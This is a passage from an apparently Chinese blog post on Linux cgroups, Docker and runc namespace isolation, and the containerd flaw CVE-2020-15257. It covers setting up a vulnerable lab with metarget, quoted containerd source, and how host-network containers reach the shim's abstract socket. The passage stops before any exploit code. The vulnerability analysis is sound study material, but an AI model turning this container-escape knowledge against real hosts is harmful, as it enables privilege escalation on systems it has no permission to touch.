<li><a target="_blank" rel="noopener" href="https://link.segmentfault.com/?enc=yPz1md2lLDULp1fkjvUNOQ==.Dt14rgEPKW3Zrh6DWSoSYbKeBbBtU+k6QNjb8rVkuH2hfw+ETns50i2oCoOuoU6CEw2FdFVtVi4baxJsmFGdZw==">memory</a> (since Linux 2.6.25; CONFIG_MEMCG)<br>统计和限制cgroup的内存的使用率，包括process memory, kernel memory, 和swap。</li>
<li><a target="_blank" rel="noopener" href="https://link.segmentfault.com/?enc=Eg+IwIflPxLek3ixFhhedA==.AwGcN0e8YW4PXb4HwYyrCxjQxHcOQeNucKjEla0hnRC3rxplnOD/dlDoLBDg1elJG9OgcJ9xwm+EJDeLtOyd/Q==">devices</a> (since Linux 2.6.26; CONFIG_CGROUP_DEVICE)<br>限制cgroup创建(mknod)和访问设备的权限。</li>
<li><a target="_blank" rel="noopener" href="https://link.segmentfault.com/?enc=FNaa1E8yTv76bS38QiJXjg==.R7nrfokVmAcav2tpLgJRfsR73vmIkhUOPpSgX85JawQobLoCiDfSBkhk37Eeq8uQ5vdp6UQEWzn43Dk2l3r25wy6aRB8Hnpxp1DR0ocrxk4=">freezer</a> (since Linux 2.6.28; CONFIG_CGROUP_FREEZER)<br>suspend和restore一个cgroup中的所有进程。</li>
<li><a target="_blank" rel="noopener" href="https://link.segmentfault.com/?enc=6hTQcqBtf8vkdl0Tq8/wiw==.X7IfZd94EeSz51Fsttpze+BaOkDUlDzf/TorJqePnV8tJUku9pOil4dsgXAQoZV26X7qaLHBsXIhFswX4FVlyA==">net_cls</a> (since Linux 2.6.29; CONFIG_CGROUP_NET_CLASSID)<br>将一个cgroup中进程创建的所有网络包加上一个classid标记，用于<a target="_blank" rel="noopener" href="https://link.segmentfault.com/?enc=56wjmzvdiE9fEwufY9vKDA==.BIV/nd7RynWgx9eIw5DM78DbBsFpV7pGavj2QQmuPQix9Gk7pByFO1BfqkE42XYL">tc</a>和iptables。 只对发出去的网络包生效，对收到的网络包不起作用。</li>
<li><a target="_blank" rel="noopener" href="https://link.segmentfault.com/?enc=4nv5DYZCH3YuMFLYSgBjcA==.x+g1iviA/RPFrPwCcj2dB/kloiHKO5UFJASH7nWbvspKOYq7pf8GlWnBYTodrczrzHJA0qP5tR/cvVPtACk7Cpzj5OII9NJC9qzvsJnRD0Y=">blkio</a> (since Linux 2.6.33; CONFIG_BLK_CGROUP)<br>限制cgroup访问块设备的IO速度。</li>
<li><a target="_blank" rel="noopener" href="https://link.segmentfault.com/?enc=mYLgQ3J4ZTWO4rRZKu4L1g==.lrbWIoXPa0WB9Cewo2XWyKQOCdZqKoy9u9rXFKRk7PLHVOQElXh1dNjfBLQEz/1On1kMpwAo6X+UEz3rfDX9fQ==">perf_event</a> (since Linux 2.6.39; CONFIG_CGROUP_PERF)<br>对cgroup进行性能监控</li>
<li><a target="_blank" rel="noopener" href="https://link.segmentfault.com/?enc=0E+2z5U4HQojgIUugNKWNw==.BwHTl+lVoJkkJYCNyVBH/K1YIcZmHkOq3xr8YEywMuokRLwjXIRbKbzwvYoTYmM7nmP2tmzFvPEiBJhImzGRYQ==">net_prio</a> (since Linux 3.3; CONFIG_CGROUP_NET_PRIO)<br>针对每个网络接口设置cgroup的访问优先级。</li>
<li><a target="_blank" rel="noopener" href="https://link.segmentfault.com/?enc=vt4mOTkg0k8XPdg7VqxAIA==.JEESmfgGixTSxfrsr1oEOmCiAQQp8aZ5qth+nHaQx6AXlhK/GdSjDc64OnuEFzYaDqlP5v2lwpuqPMJMYxYrRw==">hugetlb</a> (since Linux 3.5; CONFIG_CGROUP_HUGETLB)<br>限制cgroup的huge pages的使用量。</li>
<li><a target="_blank" rel="noopener" href="https://link.segmentfault.com/?enc=Yg6DuLJHq991+Qk64TOoPQ==.QjcTVb/Up+wmUAqLP6ucOnAXAmP6OMIl2iLvGTN01s8Wotm1MLfTmKPN7FKbPJStGTeBH/nQcyNjQPRrTymArw==">pids</a> (since Linux 4.3; CONFIG_CGROUP_PIDS)<br>限制一个cgroup及其子孙cgroup中的总进程数。</li>
</ul>
<p>1个hierarchy可以理解为1颗cgroup树</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cat /proc/cgroups</span><br><span class="line">mount | grep cgroup</span><br></pre></td></tr></table></figure>

<p>查看当前系统支持的subsystem和当前系统已经挂载的subsystem</p>
<p>这里先关注 cpu 的，进入 cpu subsystem目录，创建一个组名为 tari 的cgroup，并查看当前目录</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> /sys/fs/cgroup/cpu &amp;&amp; mkdir tari &amp;&amp; ll tari</span><br></pre></td></tr></table></figure>

<p>发现在subsystem创建目录会生成一些默认文件，通过控制文件里的数值，从而对资源进行限制。</p>
<p>如果往 <code>cpu.cfs_quota_us</code>文件写入<code>100000</code>（十万），就限制 <code>tari</code> 的cgroup<code>最多</code>能够使用<code>1核</code>的CPU（因为<code>cpu.cfs_period_us</code>配置文件默认把1核cpu分成了10万份）。写入<code>20000</code>，证明最多使用使用<code>1/5</code>核的CPU。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> 20000 &gt; /sys/fs/cgroup/cpu/tari/cpu.cfs_quota_us</span><br></pre></td></tr></table></figure>

<p>首先，新起一个进程，运行</p>
<p><img src="/img/linux-namespace/63a1a80a98e634d5d54d872cf896865df61efa33.png" class="lazyload" data-srcset="/img/linux-namespace/63a1a80a98e634d5d54d872cf896865df61efa33.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="loading-ag-5570"></p>
<p>CPU 占用率为 100%，这时把 PID 16336 加入 tari cgroup</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> 16336 &gt; /sys/fs/cgroup/cpu/tari/tasks</span><br></pre></td></tr></table></figure>

<p><img src="/img/linux-namespace/d50634ff6620197b2035ae5582de5947554c7568.png" class="lazyload" data-srcset="/img/linux-namespace/d50634ff6620197b2035ae5582de5947554c7568.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="loading-ag-5572"></p>
<p>可以看到CPU占用率为20%左右，其实从写入的配置文件名 cpu.cfs_quota_us 也易知是 CPU 配额，容器里的配额其实也是这么一回事，对于其他资源的限制，也是类似的思路</p>
<p>Docker 也是通过这种方式实现对容器进行资源隔离<sup>[17]</sup></p>
<p>默认Docker启动一个容器后会在 <code>/sys/fs/cgroup</code> 目录下的各个subsystem目录生成以容器ID为名字的目录，如</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/sys/fs/cgroup/cpu/docker/4a9df9dcac71e4475838e207e932a793faa034c1eb7bb7b75786ca5a1308c436</span><br></pre></td></tr></table></figure>

<h2 id="Docker中命名空间隔离的实现"><a href="#Docker中命名空间隔离的实现" class="headerlink" title="Docker中命名空间隔离的实现"></a>Docker中命名空间隔离的实现</h2><p>Docker 底层即 runc：<a target="_blank" rel="noopener" href="https://github.com/opencontainers/runc">https://github.com/opencontainers/runc</a></p>
<p>src/github.com/opencontainers/runc/init.go</p>
<p><code>import (&quot;... _ &quot;github.com/opencontainers/runc/libcontainer/nsenter&quot; ...&quot;)</code></p>
<p>-&gt;</p>
<p>src/github.com/opencontainers/runc/libcontainer/nsenter/nsenter.go <code>__attribute__((constructor)) init(void)</code> 的 <code>nsexec();</code> 这段 cgo 利用 gcc constructor 特性让这段C代码先于Go的runtime启动之前执行</p>
<p>nsenter_gccgo.go 中的 if AlwaysFalse 条件一开始我以为是会某种条件满足，实际并不用管，这只是如注释所说为了编译器可以成功编译它，正在是通过 <code>__attribute__</code> 特殊构造函数调的</p>
<p>-&gt;</p>
<p>nsexec.c <code>nsexec();</code> 实现命名空间和资源隔离的核心代码，与我们在 User Namespace 改进后的代码有几分相似</p>
<p>因为Docker需要支持rootless等场景下的命名空间隔离，此外由表1知一些老的内核版本不一定支持或实现了较新的（如 USER）命名空间。Docker为了更高的可拓展性，不能直接像在 【C实现命名空间隔离实验】 小节一样把相应的标志位置于 <code>clone</code> 函数内，所以 Docker 结合 clone、unshare和setns实现。</p>
<p>因个人对 runc 和 docker 之间的交互逻辑目前处于一种看懂状态，感觉别人讲的更好，推荐阅读 <a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/mSlc2RMRDe6liXb-ejtRvA">runc源码分析</a> <sup>[18]</sup></p>
<p>想进一步了解Docker，推荐阅读 <a target="_blank" rel="noopener" href="https://www.cnblogs.com/sammyliu/category/882904.html">理解Docker系列文章</a><sup>[19]</sup></p>
<h2 id="命名空间隔离不当漏洞-CVE-2020-15257"><a href="#命名空间隔离不当漏洞-CVE-2020-15257" class="headerlink" title="命名空间隔离不当漏洞 CVE-2020-15257"></a>命名空间隔离不当漏洞 CVE-2020-15257</h2><p>该漏洞是 containerd 层导致的，可参照 <a href="https://tari.moe/p/2022/goland-docker-debug">Docker (远程) Debug 调试环境搭建 - TARI TARI</a> -  0x02 Docker架构组成 部分</p>
<h3 id="漏洞环境"><a href="#漏洞环境" class="headerlink" title="漏洞环境"></a>漏洞环境</h3><p>环境部署</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./metarget cnv install cve-2020-15257</span><br></pre></td></tr></table></figure>

<p>漏洞影响版本</p>
<ul>
<li>containerd 1.3.x, 1.2.x, 1.4.x版本</li>
</ul>
<p>复现组件版本</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">root@ubuntu /o/metarget<span class="comment"># docker -v</span></span><br><span class="line">Docker version 18.03.1-ce, build 9ee9f40</span><br><span class="line">root@ubuntu /o/metarget<span class="comment"># containerd -v</span></span><br><span class="line">containerd github.com/containerd/containerd 1.5.5-0ubuntu3~18.04.2</span><br><span class="line">root@ubuntu /o/metarget<span class="comment"># runc -v</span></span><br><span class="line">runc version 1.0.1-0ubuntu2~18.04.1</span><br><span class="line">spec: 1.0.2-dev</span><br><span class="line">go: go1.13.8</span><br><span class="line">libseccomp: 2.5.1</span><br></pre></td></tr></table></figure>

<p>利用条件</p>
<p>网络模式为host的情况下，即容器启动时指定 <code>--net=host</code> 参数</p>
<p>漏洞描述</p>
<blockquote>
<p>Access controls for the shim’s API socket verified that the connecting process had an effective UID of 0, but did not otherwise restrict access to the abstract Unix domain socket. This would allow malicious containers running in the same network namespace as the shim, with an effective UID of 0 but otherwise reduced privileges, to cause new processes to be run with elevated privileges.</p>
</blockquote>
<h3 id="前置知识"><a href="#前置知识" class="headerlink" title="前置知识"></a>前置知识</h3><h4 id="Unix套接字"><a href="#Unix套接字" class="headerlink" title="Unix套接字"></a>Unix套接字</h4><p>在Linux系统中，可通过Unix域套接字在同一个主机上的进程之间进行通信，它的API调用方法和普通的TCP/IP的套接字一样，也是调用socket函数创建一个套接字，域设置成AF_UNIX</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">socket(AF_UNIX, SOCK_STREAM 或 SOCK_DGRAM, <span class="number">0</span>);</span><br></pre></td></tr></table></figure>

<p>在调用socket()函数获得新创建的Unix域套接字的文件描述符之后，再调用bind()函数将它绑定到一个本地地址上，此时需要创建并初始化一个sockaddr_un结构体，如下所示：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">sockaddr_un</span> &#123;</span> </span><br><span class="line">    <span class="keyword">sa_family_t</span> sun_family; </span><br><span class="line">    <span class="keyword">char</span> sun_path[<span class="number">108</span>]; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>第一个字段 <code>sa_family_t</code> 需要设置成 <code>AF_UNIX</code>，第二个字段 <code>sun_path</code> 表示的是一个路径名，它分为两种：</p>
<ul>
<li>普通的文件路径：</li>
</ul>
<p>它是一个合法的Linux文件路径，以<code>NULL</code>结尾。在绑定一个Unix域套接字时，会在文件系统中的相应位置上创建一个文件，当不再需要这个Unix域套接字时，可以使用remove()函数或者unlink()函数将这个对应的文件删除。<strong>如果在文件系统中，已经有了一个文件和指定的路径名相同，则绑定会失败</strong>。</p>
<ul>
<li>抽象名字空间路径：</li>
</ul>
<p>抽象名字空间路径以<code>NULL</code>开始，后面可以跟任何数据，甚至可以是<code>NULL</code>，可以不以<code>NULL</code>结尾。相对于普通的文件路径，这种地址在文件系统上并没有实际的文件与它相对应。</p>
<p>也就是说，<strong>它不会在文件系统中创建出一个新的文件。在Unix域套接字的文件描述符关闭的时候就会自动消失，所以无需担心与文件系统中已存在的文件产生命名冲突，也不需要在使用完套接字之后删除附带产生的这个文件</strong>。</p>
<h4 id="docker网络模式"><a href="#docker网络模式" class="headerlink" title="docker网络模式"></a>docker网络模式</h4><p>在使用docker run命令创建并运行容器时，可以使用–network选项指定容器的网络模式。</p>
<p>Docker有以下4种网络模式：</p>
<ul>
<li>none：这种模式下容器内部只有loopback回环网络，没有其他网卡，不能访问外网，完全封闭的网络；</li>
<li>container：指定一个已经存在的容器名字，新的容器会和这个已经存在的容器共享一个网络命名空间，IP、端口范围也一起在这两个容器中共享；</li>
<li>bridge：这是docker默认的网络模式，会为每一个容器分配网络命名空间，设置IP，保证容器内的进程使用独立的网络环境，使得容器和容器之间、容器和主机之间实现网络隔离；</li>
<li>host：这种模式下，容器和主机已经没有网络隔离了，它们共享同一个网络命名空间，容器的网络配置和主机完全一样，使用主机的IP地址和端口，可以查看到主机所有网卡信息、网络资源，在网络性能上没有损耗。</li>
</ul>
<p>但也正是因为没有网络隔离，容器和主机容易产生网络资源冲突、争抢，以及其他的一些问题。本文所述漏洞也是在这种模式下产生的。</p>
<h3 id="漏洞原因"><a href="#漏洞原因" class="headerlink" title="漏洞原因"></a>漏洞原因</h3><p>每次启动一个容器时，containerd会创建一个新的containerd-shim进程，由containerd-shim进程（而不是containerd）来直接控制容器的整个生命周期。</p>
<p>containerd在创建containerd-shim之前，会创建一个Unix域套接字，设置的是抽象名字空间路径：</p>
<p><a target="_blank" rel="noopener" href="https://github.com/containerd/containerd/blob/v1.4.2/runtime/v1/linux/bundle.go#L136">https://github.com/containerd/containerd/blob/v1.4.2/runtime/v1/linux/bundle.go#L136</a></p>
<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(b *bundle)</span> <span class="title">shimAddress</span><span class="params">(namespace  <span class="keyword">string</span>)</span> <span class="title">string</span></span> &#123;</span><br><span class="line">    d := sha256.Sum256([]<span class="keyword">byte</span>(filepath.Join(namespace,  b.id)))</span><br><span class="line">    <span class="keyword">return</span>  filepath.Join(<span class="keyword">string</span>(filepath.Separator), <span class="string">&quot;containerd-shim&quot;</span>,  fmt.Sprintf(<span class="string">&quot;%x.sock&quot;</span>, d))</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><a target="_blank" rel="noopener" href="https://github.com/containerd/containerd/blob/v1.4.2/runtime/v1/shim/client/client.go">containerd/client.go at v1.4.2 · containerd/containerd · GitHub</a></p>
<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">WithStart</span><span class="params">(binary, address, daemonAddress, cgroup <span class="keyword">string</span>, debug <span class="keyword">bool</span>, exitHandler <span class="keyword">func</span>()</span>) <span class="title">Opt</span></span> &#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="function"><span class="keyword">func</span><span class="params">(ctx context.Context, config shim.Config)</span> <span class="params">(_ shimapi.ShimService, _ io.Closer, err error)</span></span> &#123;</span><br><span class="line">    socket, err := newSocket(address)</span><br><span class="line">    <span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="literal">nil</span>, <span class="literal">nil</span>, err</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">defer</span> socket.Close()</span><br><span class="line">    f, err := socket.File()</span><br><span class="line">    ...</span><br><span class="line"></span><br><span class="line">    cmd, err := newCommand(binary, daemonAddress, debug, config, f, stdoutLog, stderrLog)</span><br><span class="line">    <span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="literal">nil</span>, <span class="literal">nil</span>, err</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> err := cmd.Start(); err != <span class="literal">nil</span> &#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="literal">nil</span>, <span class="literal">nil</span>, errors.Wrapf(err, <span class="string">&quot;failed to start shim&quot;</span>)</span><br><span class="line">    &#125;</span><br><span class="line">...</span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">newCommand</span><span class="params">(binary, daemonAddress <span class="keyword">string</span>, debug <span class="keyword">bool</span>, config shim.Config, socket *os.File, stdout, stderr io.Writer)</span> <span class="params">(*exec.Cmd, error)</span></span> &#123;</span><br><span class="line">  selfExe, err := os.Executable()</span><br><span class="line">  <span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">nil</span>, err</span><br><span class="line">  &#125;</span><br><span class="line">  args := []<span class="keyword">string</span>&#123;</span><br><span class="line">    <span class="string">&quot;-namespace&quot;</span>, config.Namespace,</span><br><span class="line">    <span class="string">&quot;-workdir&quot;</span>, config.WorkDir,</span><br><span class="line">    <span class="string">&quot;-address&quot;</span>, daemonAddress,</span><br><span class="line">    <span class="string">&quot;-containerd-binary&quot;</span>, selfExe,</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  ...</span><br><span class="line"></span><br><span class="line">  cmd := exec.Command(binary, args...)</span><br><span class="line">  ...</span><br><span class="line">  cmd.ExtraFiles = <span class="built_in">append</span>(cmd.ExtraFiles, socket)</span><br><span class="line">  cmd.Env = <span class="built_in">append</span>(os.Environ(), <span class="string">&quot;GOMAXPROCS=2&quot;</span>)</span><br><span class="line">...</span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">newSocket</span><span class="params">(address <span class="keyword">string</span>)</span> <span class="params">(*net.UnixListener, error)</span></span> &#123;</span><br><span class="line">  <span class="keyword">if</span> <span class="built_in">len</span>(address) &gt; <span class="number">106</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">nil</span>, errors.Errorf(<span class="string">&quot;%q: unix socket path too long (&gt; 106)&quot;</span>, address)</span><br><span class="line">  &#125;</span><br><span class="line">  l, err := net.Listen(<span class="string">&quot;unix&quot;</span>, <span class="string">&quot;\x00&quot;</span>+address)</span><br></pre></td></tr></table></figure>

<p>注意最后一行中，address前面加上了一个<code>\x00</code>，这个就表示<strong>抽象名字空间路径的Unix域套接字</strong>。</p>
<p>containerd传递Unix域套接字文件描述符给containerd-shim。containerd-shim在正式启动之后，会基于父进程（也就是containerd）传递的Unix域套接字文件描述符，建立gRPC服务，对外暴露一些API用于container、task的控制： <a target="_blank" rel="noopener" href="https://github.com/containerd/containerd/blob/v1.4.2/runtime/v1/shim/v1/shim.proto#L18">containerd/shim.proto at v1.4.2 · containerd/containerd · GitHub</a></p>
<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">service  Shim &#123;</span><br><span class="line">    <span class="comment">// State returns shim and task state  information.</span></span><br><span class="line">    rpc State(StateRequest) returns  (StateResponse);</span><br><span class="line">    rpc Create(CreateTaskRequest) returns  (CreateTaskResponse);</span><br><span class="line">    rpc Start(StartRequest) returns  (StartResponse);</span><br><span class="line">    rpc Delete(google.protobuf.Empty) returns  (DeleteResponse);</span><br><span class="line">    rpc DeleteProcess(DeleteProcessRequest)  returns (DeleteResponse);</span><br><span class="line">    rpc ListPids(ListPidsRequest) returns  (ListPidsResponse);</span><br><span class="line">    rpc Pause(google.protobuf.Empty) returns  (google.protobuf.Empty);</span><br><span class="line">    rpc Resume(google.protobuf.Empty) returns  (google.protobuf.Empty);</span><br><span class="line">    rpc Checkpoint(CheckpointTaskRequest)  returns (google.protobuf.Empty);</span><br><span class="line">    rpc Kill(KillRequest) returns  (google.protobuf.Empty);</span><br><span class="line">    rpc Exec(ExecProcessRequest) returns  (google.protobuf.Empty);</span><br><span class="line">    rpc ResizePty(ResizePtyRequest) returns  (google.protobuf.Empty);</span><br><span class="line">    rpc CloseIO(CloseIORequest) returns  (google.protobuf.Empty);</span><br><span class="line">    <span class="comment">// ShimInfo returns information about the  shim.</span></span><br><span class="line">    rpc ShimInfo(google.protobuf.Empty)  returns (ShimInfoResponse);</span><br><span class="line">    rpc Update(UpdateTaskRequest) returns  (google.protobuf.Empty);</span><br><span class="line">    rpc Wait(WaitRequest) returns (WaitResponse);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>此时，containerd-shim做为server向外提供服务，containerd做为client，调用containerd-shim提供的API实现对容器的间接管理。</p>
<p>抽象Unix域套接字没有权限限制，所以只能靠连接进程的UID、GID做访问控制，限定了只能是root（UID=0，GID=0）用户才能连接成功。</p>
<p><a target="_blank" rel="noopener" href="https://github.com/containerd/containerd/blob/v1.4.2/vendor/github.com/containerd/ttrpc/unixcreds_linux.go">containerd/unixcreds_linux.go at v1.4.2 · containerd/containerd · GitHub</a></p>
<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// UnixSocketRequireUidGid requires specific *effective* UID/GID, rather than the real UID/GID.</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// For example, if a daemon binary is owned by the root (UID 0) with SUID bit but running as an</span></span><br><span class="line"><span class="comment">// unprivileged user (UID 1001), the effective UID becomes 0, and the real UID becomes 1001.</span></span><br><span class="line"><span class="comment">// So calling this function with uid=0 allows a connection from effective UID 0 but rejects</span></span><br><span class="line"><span class="comment">// a connection from effective UID 1001.</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// See socket(7), SO_PEERCRED: &quot;The returned credentials are those that were in effect at the time of the call to connect(2) or socketpair(2).&quot;</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">UnixSocketRequireUidGid</span><span class="params">(uid, gid <span class="keyword">int</span>)</span> <span class="title">UnixCredentialsFunc</span></span> &#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="function"><span class="keyword">func</span><span class="params">(ucred *unix.Ucred)</span> <span class="title">error</span></span> &#123;</span><br><span class="line">    <span class="keyword">return</span> requireUidGid(ucred, uid, gid)</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">...</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">UnixSocketRequireSameUser</span><span class="params">()</span> <span class="title">UnixCredentialsFunc</span></span> &#123;</span><br><span class="line">  euid, egid := os.Geteuid(), os.Getegid()</span><br><span class="line">  <span class="keyword">return</span> UnixSocketRequireUidGid(euid, egid)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">...</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">requireUidGid</span><span class="params">(ucred *unix.Ucred, uid, gid <span class="keyword">int</span>)</span> <span class="title">error</span></span> &#123;</span><br><span class="line">  <span class="keyword">if</span> (uid != <span class="number">-1</span> &amp;&amp; <span class="keyword">uint32</span>(uid) != ucred.Uid) || (gid != <span class="number">-1</span> &amp;&amp; <span class="keyword">uint32</span>(gid) != ucred.Gid) &#123;</span><br><span class="line">    <span class="keyword">return</span> errors.Wrap(syscall.EPERM, <span class="string">&quot;ttrpc: invalid credentials&quot;</span>)</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="literal">nil</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>通过访问/proc/net/unix文件，可以获取到当前网络命名空间下所有的Unix域套接字信息。</p>
<p>在默认情况下，docker run启动的容器的网络模式是bridge，容器和主机之间实现了网络隔离，所以在容器内部读取/proc/net/unix文件，看不到任何信息，如下所示：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">root@ubuntu ~<span class="comment"># docker run -it --rm busybox cat /proc/net/unix</span></span><br><span class="line">Num       RefCount Protocol Flags    Type St Inode Path</span><br></pre></td></tr></table></figure>

<p>但是在host模式下，由于容器和主机共享同一个网络命名空间，容器能访问到主机中的所有网络资源，所以在容器内部读取/proc/net/unix文件，显示的就是真实主机中的信息，如下所示：</p>
<p><img src="/img/linux-namespace/e2eaa1ec84b1518bff3a27a41b453e3f9bdd417c.png" class="lazyload" data-srcset="/img/linux-namespace/e2eaa1ec84b1518bff3a27a41b453e3f9bdd417c.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="loading-ag-5574"></p>
<ul>
<li>/var/run/docker.sock：Docker Daemon监听的Unix域套接字，用于Docker client之间通信；</li>
<li>/run/containerd/containerd.sock：containerd监听的Unix域套接字，Docker Daemon、ctr可以通过它和containerd通信；</li>
<li>@/containerd-shim/3d6a9ed878c586fd715d9b83158ce32b6109af11991bfad4cf55fcbdaf6fee76.sock：</li>
</ul>
<p>这个就是上文所述的，containerd-shim监听的Unix域套接字，containerd通过它和containerd-shim通信，控制管理容器。</p>
<p>/var/run/docker.sock、/run/containerd/containerd.sock这两者是普通的文件路径，虽然容器共享了主机的网络命名空间，<strong>但没有共享mnt命名空间，容器和主机之间的磁盘挂载点和文件系统仍然存在隔离</strong>，所以在容器内部仍然不能通过/var/run/docker.sock、/run/containerd/containerd.sock这样的路径连接对应的Unix域套接字。</p>
<p>也就是说:</p>
<ul>
<li>host模式下，容器共享了主机的网络命名空间，也就能够去连接</li>
</ul>
<p>@/containerd-shim/3d6a9ed878c586fd715d9b83158ce32b6109af11991bfad4cf55fcbdaf6fee76.sock</p>
<p>这一类的抽象Unix域套接字。</p>
<ul>
<li>而且在默认情况下，容器内部的进程都是以root用户启动的，所以也能通过UnixSocketRequireSameUser的校验。</li>
</ul>
